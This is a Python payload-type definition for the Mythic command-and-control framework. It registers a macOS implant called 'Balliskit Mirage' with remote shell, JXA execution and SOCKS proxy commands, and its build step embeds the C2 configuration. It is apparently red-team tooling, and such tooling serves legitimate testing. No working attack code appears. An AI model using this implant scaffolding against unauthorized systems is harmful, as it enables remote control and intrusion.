import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import base64


class BasicPythonAgent(PayloadType):
    name = "Balliskit Mirage"
    file_extension = "json"
    author = "Balliskit Team"
    supported_os = [SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = []
    note = """This payload is for use with Balliskit software."""
    supports_dynamic_loading = True
    c2_profiles = ["httpx"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = [
        BuildParameter(
            name="profiles",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select the C2 profile to use",
            choices=["httpx"],
            default_value="httpx",
            required=True,
        )
    ]
    agent_path = pathlib.Path(".") / "balliskit_implant"
    agent_icon_path = agent_path / "agent_functions" / "basic_python_agent.svg"
    commands = [
        "shell",
        "exit",
        #"runmacho", will be added in future versions
        "runjxa",
        "socks",
        "interval"
    ]
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values")
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        info = self.c2info[0].__dict__

        # Retrieve the selected profile from build parameters
        selected_profile = self.get_parameter("profiles")
        info['uuid'] = self.uuid
        info['selected_profile'] = selected_profile

        # If httpx profile is selected, retrieve and embed the raw config file
        if selected_profile == "httpx" and "parameters" in info:
            raw_c2_config_id = info["parameters"].get("raw_c2_config")
            if raw_c2_config_id:
                try:
                    # Fetch the config file content from Mythic via MythicRPC
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=raw_c2_config_id)
                    )
                    if file_resp.Success:
                        raw_config_bytes = file_resp.Content
                        # Embed as base64 string so it survives JSON serialisation
                        info['raw_c2_config_content'] = base64.b64encode(raw_config_bytes).decode()
                    else:
                        logging.warning(f"[Balliskit] Could not fetch raw_c2_config: {file_resp.Error}")
                except Exception as e:
                    logging.error(f"[Balliskit] Exception fetching raw_c2_config: {e}")

        resp.payload = json.dumps(info).encode()
        return resp